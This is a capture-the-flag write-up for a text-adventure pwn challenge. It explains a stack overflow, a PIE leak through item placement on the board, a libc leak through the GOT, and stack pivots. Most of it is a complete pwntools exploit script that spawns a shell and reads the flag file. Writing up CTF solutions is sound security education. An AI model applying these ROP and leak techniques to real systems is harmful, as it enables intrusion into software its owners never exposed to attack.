# adventure

**Category:** pwn

---

#### Description

Text-adventure pwnable.

Remote: `nc chall.lac.tf 31337`

#### Solution

The game is a 16x16 grid with 8 items. Grabbing the Flag triggers a password prompt.

**1) Bug: stack overflow in `check_flag_password`**

In `attachments/chall.c`:

* `char password[0020];` where `0020` is octal = 16 bytes
* `fgets(password, 0x20, stdin);` reads up to 31 bytes + NUL

So we can overwrite saved `rbp` and the return address.

**2) Leak PIE base via board layout**

`init_board()` places each item using a byte of the *runtime* address of `main`:

* For item index `i`, it uses `bytes[i]` (byte `i` of the little-endian `main` pointer)
* `x = high_nibble(bytes[i])`, `y = low_nibble(bytes[i])`
* If the cell collides, it linearly probes forward.

By walking the whole grid (serpentine), we record each item’s final `(x,y)`. We then invert the placement algorithm to recover `main` and compute:

* `pie_base = main_addr - 0x1adf`

Collision probing can create ambiguities; the exploit resolves them by enforcing that `(main_addr - 0x1adf) & 0xfff == 0` (PIE base must be page-aligned).

**3) Turn the overflow into a `.bss` write primitive**

We return into the middle of `check_flag_password` right before its `fgets` call (`FGETS_SETUP`), with a controlled `rbp`.

Setting `rbp = pie_base + 0x4030` makes the buffer pointer used by that `fgets` (`rbp - 0x10`) equal `pie_base + 0x4020`, which is the global `last_item` pointer. That `fgets` becomes a 31-byte write into the writable `.bss` page.

**4) Leak libc via `last_item` printing**

`print_inventory()` prints `last_item` with `%-6s`. If we overwrite `last_item = &GOT[puts]`, the inventory line outputs the raw little-endian bytes of the resolved libc `puts` pointer (until the first NUL), giving a libc leak and therefore `libc_base`.

**5) ROP chain and pivots**

The binary has no `pop rdi; ret`, so the exploit uses:

* The global `history` array as a tiny ROP stack (each command can store 6 bytes of an address).
* A double `leave; ret` pivot to start executing from `history`.
* Two more redirected `fgets` calls to write a minimal libc ROP chain into high `.bss`.

Final libc chain calls `system("/bin/sh")`, then the exploit sends `cat /app/flag.txt`.

**6) Flag path in jail**

The Dockerfile copies the rootfs to `/srv` and then runs under `pwn.red/jail`, which typically chroots into `/srv`. That makes `/srv/app/flag.txt` in the image visible as `/app/flag.txt` to the running program and spawned shell.

**Exploit**

```python
#!/usr/bin/env python3
from pwn import *
import re
import sys

context.binary = ELF('./attachments/chall', checksec=False)
context.log_level = 'info'

LIBC_PATH = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(LIBC_PATH, checksec=False)

# Binary offsets
MAIN        = 0x1ADF
CHECK_FLAG  = 0x15B5
FGETS_SETUP = 0x164D  # mid-check_flag_password: loads stdin, lea rax,[rbp-0x10], fgets
LEAVE_RET   = 0x14B7
POP_RBP_RET = 0x1233
RET         = 0x101A
PRINT_INV   = 0x138B
GOT_PUTS    = 0x3F98
LAST_ITEM   = 0x4020
HISTORY     = 0x40A0

# High scratch in the single RW .bss page (PIE+0x4000..PIE+0x4fff). Keep this near
# the end of the page so libc calls won't smash copy-relocated globals (stdout/stderr).
# Also pick %16 == 8 for correct system() entry alignment.
CHAIN_BASE  = 0x4FC8

NUM_ITEMS = 8
BOARD_SIZE = 16

def connect():
    if args.REMOTE or args.R:
        return remote('chall.lac.tf', 31337)
    elif args.STRACE:
        # Useful for confirming whether our final ROP actually reaches system()
        # (look for execve("/bin/sh", ...) in /tmp/adventure.strace).
        return process(['strace', '-f', '-o', '/tmp/adventure.strace', './attachments/chall'])
    else:
        return process('./attachments/chall')

def send_cmd(r, cmd):
    """Send a game command and return the response."""
    r.sendline(cmd.encode() if isinstance(cmd, str) else cmd)
    resp = r.recvuntil(b'> ', timeout=10)
    return resp

def send_raw_cmd(r, data):
    """Send raw bytes as a command (for planting chain in history)."""
    r.send(data)
    # Need newline to complete the fgets
    # Actually the data already includes newline at the end
    resp = r.recvuntil(b'> ', timeout=10)
    return resp

def explore_board(r):
    """Walk the board in serpentine pattern, find all items. Returns dict {item_idx: (x, y)}."""
    items = {}
    px, py = 0, 0  # start position

    def parse_spot(resp):
        """Check if we spotted an item."""
        for i, name in enumerate(["Sword", "Shield", "Potion", "Key", "Scroll", "Amulet", "Crown", "Flag"]):
            if f"spot a {name}".encode() in resp or f"glimmering {name}".encode() in resp:
                return i, name
        return None, None

    # Check starting position (0,0)
    resp = send_cmd(r, "look")
    idx, name = parse_spot(resp)
    if idx is not None:
        items[idx] = (px, py)
        log.info(f"Found {name} (idx={idx}) at ({px},{py})")

    moves_used = 1  # for the 'look' command

    # Serpentine walk
    for row in range(BOARD_SIZE):
        if row > 0:
            resp = send_cmd(r, "s")
            py += 1
            moves_used += 1
            idx, name = parse_spot(resp)
            if idx is not None:
                items[idx] = (px, py)
                log.info(f"Found {name} (idx={idx}) at ({px},{py})")

        if row % 2 == 0:
            # Go east
            for col in range(BOARD_SIZE - 1):
                resp = send_cmd(r, "e")
                px += 1
                moves_used += 1
                idx, name = parse_spot(resp)
                if idx is not None:
                    items[idx] = (px, py)
                    log.info(f"Found {name} (idx={idx}) at ({px},{py})")
                if len(items) == NUM_ITEMS:
                    return items, px, py, moves_used
        else:
            # Go west
            for col in range(BOARD_SIZE - 1):
                resp = send_cmd(r, "w")
                px -= 1
                moves_used += 1
                idx, name = parse_spot(resp)
                if idx is not None:
                    items[idx] = (px, py)
                    log.info(f"Found {name} (idx={idx}) at ({px},{py})")
                if len(items) == NUM_ITEMS:
                    return items, px, py, moves_used

    return items, px, py, moves_used

def reconstruct_address(items):
    """Given item positions, reconstruct the address of main."""
    # bytes[7] and bytes[6] are 0x00 (48-bit canonical address)
    candidates = {i: [] for i in range(8)}
    candidates[6] = [0]
    candidates[7] = [0]

    # Items placed in order i=7,6,...,0. The final position of item i depends on
    # byte[i] and the occupied cells from items i+1..7.
    for i in range(5, -1, -1):
        occupied = {items[j] for j in range(i + 1, NUM_ITEMS) if j in items}
        want = items.get(i)
        if want is None:
            raise ValueError(f"missing item {i} for PIE reconstruction")

        for b in range(256):
            x = (b >> 4) & 0x0F
            y = b & 0x0F
            while (x, y) in occupied:
                x = (x + 1) % BOARD_SIZE
                if x == 0:
                    y = (y + 1) % BOARD_SIZE
            if (x, y) == want:
                candidates[i].append(b)

        if not candidates[i]:
            raise ValueError(f"no candidates for byte {i}")

    # Resolve ambiguities by enforcing that the derived PIE base is page-aligned:
    #   pie_base = main_addr - MAIN  =>  (main_addr - MAIN) & 0xfff == 0
    target_low12 = MAIN & 0xFFF

    best = None
    # Prune early using the low 12-bit constraint once byte0/byte1 are chosen.
    for b0 in candidates[0]:
        for b1 in candidates[1]:
            low12 = b0 | ((b1 & 0x0F) << 8)
            if low12 != target_low12:
                continue
            for b2 in candidates[2]:
                for b3 in candidates[3]:
                    for b4 in candidates[4]:
                        for b5 in candidates[5]:
                            addr = (
                                (b0 << 0)  |
                                (b1 << 8)  |
                                (b2 << 16) |
                                (b3 << 24) |
                                (b4 << 32) |
                                (b5 << 40)
                            )
                            # bytes[6]=bytes[7]=0 already.
                            if ((addr - MAIN) & 0xFFF) != 0:
                                continue
                            best = addr
                            break
                        if best is not None:
                            break
                    if best is not None:
                        break
                if best is not None:
                    break
            if best is not None:
                break
        if best is not None:
            break

    if best is None:
        raise ValueError("PIE reconstruction ambiguous; no page-aligned solution")
    return best

def navigate_to(r, px, py, tx, ty):
    """Navigate from (px,py) to (tx,ty). Returns moves used."""
    moves = 0
    while px != tx:
        if px < tx:
            send_cmd(r, "e")
            px += 1
        else:
            send_cmd(r, "w")
            px -= 1
        moves += 1
    while py != ty:
        if py < ty:
            send_cmd(r, "s")
            py += 1
        else:
            send_cmd(r, "n")
            py -= 1
        moves += 1
    return moves, px, py

def plant_history_entry(r, addr_value):
    """Send a game command that stores addr_value in the current history entry.
    addr_value is an 8-byte int. We send the low 6 bytes + newline."""
    addr_bytes = p64(addr_value)
    # The main loop stores commands as C strings (strcspn/strncpy/strlen/strcmp).
    # If any of the first 6 bytes are NUL or LF, the history entry will truncate
    # and our "address" qword becomes garbage. Treat this as a hard failure and
    # retry with a fresh ASLR layout.
    for j in range(6):
        if addr_bytes[j] == 0x00:
            raise ValueError(f"history addr has NUL at byte {j}: {hex(addr_value)}")
        if addr_bytes[j] == 0x0a:
            raise ValueError(f"history addr has LF at byte {j}: {hex(addr_value)}")

    payload = addr_bytes[:6] + b'\n'
    r.send(payload)
    resp = r.recvuntil(b'> ', timeout=10)
    return resp

def overflow_payload(rbp_val, ret_val):
    """Build the 31-byte overflow payload for check_flag_password.
    16 bytes padding + 8 bytes rbp + 7 bytes ret (8th byte = 0x00 from fgets)."""
    payload = b'A' * 16
    payload += p64(rbp_val)
    payload += p64(ret_val)[:7]  # 7 bytes, 8th set to 0x00 by fgets
    assert len(payload) == 31
    return payload

def fgets_redirect_payload(write_val_0, write_val_1, new_rbp, ret_addr):
    """Build the 31-byte payload for the redirected fgets.
    Writes to [old_rbp - 0x10]:
    bytes 0-7: write_val_0 (at target)
    bytes 8-15: write_val_1 (at target+8)
    bytes 16-23: new_rbp (for leave;ret)
    bytes 24-30: ret_addr low 7 bytes (for leave;ret)
    """
    payload = p64(write_val_0)
    payload += p64(write_val_1)
    payload += p64(new_rbp)
    payload += p64(ret_addr)[:7]
    assert len(payload) == 31
    return payload

def has_bad_newline_bytes(data: bytes) -> bool:
    return b'\n' in data

def ensure_no_newline(payload: bytes, label: str):
    if has_bad_newline_bytes(payload):
        raise ValueError(f"{label} contains newline byte; fgets would truncate it")

def wait_password(r):
    return r.recvuntil(b'Password: ', timeout=15)

def exploit_once():
    r = connect()

    # Receive banner and help
    r.recvuntil(b'> ', timeout=15)

    log.info("=== Phase 1: Board Exploration & PIE Leak ===")
    items, px, py, moves_used = explore_board(r)
    log.info(f"Found {len(items)} items in {moves_used} moves. Position: ({px},{py})")

    if len(items) < NUM_ITEMS:
        log.warning(f"Only found {len(items)}/8 items!")
        for i in range(NUM_ITEMS):
            if i not in items:
                log.warning(f"  Missing item {i}")

    # Reconstruct PIE base
    main_addr = reconstruct_address(items)
    pie_base = main_addr - MAIN
    log.info(f"Reconstructed main addr: {hex(main_addr)}")
    log.info(f"PIE base: {hex(pie_base)}")

    # Verify sanity
    if pie_base & 0xFFF != 0:
        log.error("PIE base not page-aligned! Something went wrong.")
        r.close()
        return
    if (pie_base >> 40) not in [0x55, 0x56, 0x00]:
        log.warning(f"Unusual PIE base high byte: {hex(pie_base >> 40)}")

    # Check for bad bytes in key addresses
    def check_addr(name, addr):
        bs = p64(addr)
        for j in range(6):
            if bs[j] == 0x00:
                log.warning(f"{name} ({hex(addr)}) has null at byte {j}")
                return False
            if bs[j] == 0x0a:
                log.warning(f"{name} ({hex(addr)}) has newline at byte {j}")
                return False
        return True

    check_addr("PRINT_INV", pie_base + PRINT_INV)
    check_addr("MAIN", pie_base + MAIN)
    check_addr("LEAVE_RET", pie_base + LEAVE_RET)

    log.info("=== Phase 2: Plant ROP Chains In History ===")
    # chainA:
    #   dummy_rbp
    #   print_inventory               (leaks puts via last_item=&GOT[puts])
    #   pop rbp; ret
    #   rbp = CHAIN_BASE+0x10
    #   FGETS_SETUP                   (stage3 write1 input)
    #
    # chainB:
    #   dummy_rbp
    #   pop rbp; ret
    #   rbp = CHAIN_BASE+0x20
    #   FGETS_SETUP                   (stage3 write2 input)
    chain_base_addr = pie_base + CHAIN_BASE
    chainA_idx = moves_used
    chainA_addr = pie_base + HISTORY + 8 * chainA_idx
    chainB_idx = chainA_idx + 5
    chainB_addr = pie_base + HISTORY + 8 * chainB_idx

    log.info(f"Planting chainA at history[{chainA_idx}] (addr={hex(chainA_addr)})")
    send_cmd(r, "AAAAAA")  # dummy rbp (<=6 bytes: consumes newline)
    moves_used += 1
    plant_history_entry(r, pie_base + PRINT_INV)
    moves_used += 1
    plant_history_entry(r, pie_base + POP_RBP_RET)
    moves_used += 1
    plant_history_entry(r, chain_base_addr + 0x10)
    moves_used += 1
    plant_history_entry(r, pie_base + FGETS_SETUP)
    moves_used += 1

    log.info(f"Planting chainB at history[{chainB_idx}] (addr={hex(chainB_addr)})")
    send_cmd(r, "BBBBBB")  # dummy rbp
    moves_used += 1
    plant_history_entry(r, pie_base + POP_RBP_RET)
    moves_used += 1
    plant_history_entry(r, chain_base_addr + 0x20)
    moves_used += 1
    plant_history_entry(r, pie_base + FGETS_SETUP)
    moves_used += 1

    log.info(f"Chains planted. Moves used: {moves_used}")

    log.info("=== Phase 3: Navigate to Flag and Grab ===")
    flag_pos = items.get(7)
    if flag_pos is None:
        log.error("Flag item not found on board!")
        r.close()
        return

    nav_moves, px, py = navigate_to(r, px, py, flag_pos[0], flag_pos[1])
    moves_used += nav_moves
    log.info(f"Navigated to Flag at {flag_pos}. Moves: {moves_used}")

    # Grab the flag - this triggers check_flag_password
    r.sendline(b"grab")
    moves_used += 1
    # Should get the flag password prompt
    resp = wait_password(r)
    log.info("Got password prompt (1st check_flag_password)")

    log.info("=== Phase 4: Overflow → Jump To FGETS_SETUP (Write last_item) ===")
    # rbp = PIE+0x4030, so buffer=rbp-0x10 points to last_item (PIE+0x4020).
    payload1 = overflow_payload(pie_base + 0x4030, pie_base + FGETS_SETUP)
    ensure_no_newline(payload1, "overflow_to_fgets")
    r.send(payload1)

    log.info("=== Phase 5: Redirected Fgets Payload (last_item=&GOT[puts], pivot chainA) ===")
    payload2 = fgets_redirect_payload(
        write_val_0 = pie_base + GOT_PUTS,    # last_item = &GOT[puts]
        write_val_1 = 0x4141414141414141,    # padding at PIE+0x4028
        new_rbp     = chainA_addr,           # pivot to chainA
        ret_addr    = pie_base + LEAVE_RET,
    )
    ensure_no_newline(payload2, "redirected_fgets_leak")
    r.send(payload2)

    log.info("=== Phase 7: Parse Libc Leak ===")
    # We should now run print_inventory (leak) and return into check_flag_password.
    r.recvuntil(b'/300 ', timeout=15)
    leaked_bytes = r.recvn(6, timeout=5)
    puts_addr = u64(leaked_bytes + b'\x00\x00')
    libc_base = puts_addr - libc.symbols['puts']
    log.info(f"Leaked puts address: {hex(puts_addr)}")
    log.info(f"Libc base: {hex(libc_base)}")

    if libc_base & 0xFFF != 0:
        log.error("Libc base not page-aligned; leak likely failed.")
        r.close()
        return

    log.info("=== Phase 8: Stage 3 system('/bin/sh') (No Banner) ===")
    rop_libc = ROP(libc)
    pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address + libc_base
    binsh = next(libc.search(b'/bin/sh\x00')) + libc_base
    system = libc.symbols['system'] + libc_base

    # chainA has already returned into FGETS_SETUP with rbp=CHAIN_BASE+0x10.
    # First stage3 write pivots to chainB.
    payload_w1 = fgets_redirect_payload(
        write_val_0 = 0x4141414141414141,   # dummy rbp at CHAIN_BASE
        write_val_1 = pop_rdi,              # CHAIN_BASE+8
        new_rbp     = chainB_addr,          # pivot to chainB in history
        ret_addr    = pie_base + LEAVE_RET,
    )
    ensure_no_newline(payload_w1, "stage3_write1")

    # chainB sets rbp=CHAIN_BASE+0x20 and returns into FGETS_SETUP; second write pivots to CHAIN_BASE.
    payload_w2 = fgets_redirect_payload(
        write_val_0 = binsh,                # CHAIN_BASE+0x10
        write_val_1 = system,               # CHAIN_BASE+0x18
        new_rbp     = chain_base_addr,      # pivot base for leave;ret gadget
        ret_addr    = pie_base + LEAVE_RET,
    )
    ensure_no_newline(payload_w2, "stage3_write2")

    r.send(payload_w1 + payload_w2)

    # In the `pwn.red/jail` image, the ubuntu rootfs is usually mounted/chrooted at `/`,
    # so files copied to `/srv/app/...` in the Dockerfile become `/app/...` at runtime.
    cmd = args.CMD.encode() if getattr(args, "CMD", None) else b'cat /app/flag.txt'
    r.sendline(cmd)
    buf = b''
    # Bytes regex. In a raw string, write `\{` (not `\\{`) to match a literal `{`.
    flag_re = re.compile(rb'lactf\{[^\n}]+\}')
    for _ in range(40):
        try:
            chunk = r.recv(timeout=1)
        except EOFError:
            break
        if not chunk:
            continue
        buf += chunk
        m = flag_re.search(buf)
        if m:
            flag = m.group(0)
            log.success(f"FLAG: {flag.decode(errors='ignore')}")
            if args.INTERACTIVE:
                r.interactive()
            r.close()
            return flag

    log.warning(f"Did not find flag in output; captured {len(buf)} bytes")
    if getattr(args, "DUMP", False):
        # Debugging aid: show what we actually got back.
        log.info("First 256 bytes of output:\n" + hexdump(buf[:256]))
    if args.INTERACTIVE:
        r.interactive()
    r.close()
    return None

if __name__ == '__main__':
    # ASLR occasionally produces addresses containing a newline byte. Since all of our
    # writes are through fgets, that would truncate payloads and break exploitation.
    max_tries = 1 if getattr(args, "ONCE", False) else 50
    for i in range(1, max_tries + 1):
        try:
            flag = exploit_once()
            if flag:
                # Print a clean flag line for tooling/grep.
                if isinstance(flag, bytes):
                    flag = flag.decode(errors='ignore')
                print(flag)
                break
        except (ValueError, EOFError) as e:
            log.warning(f"Attempt {i}/{max_tries} failed: {e}")
        except Exception as e:
            # Keep retries narrow but practical for CTF use.
            log.warning(f"Attempt {i}/{max_tries} failed (unexpected): {type(e).__name__}: {e}")
```
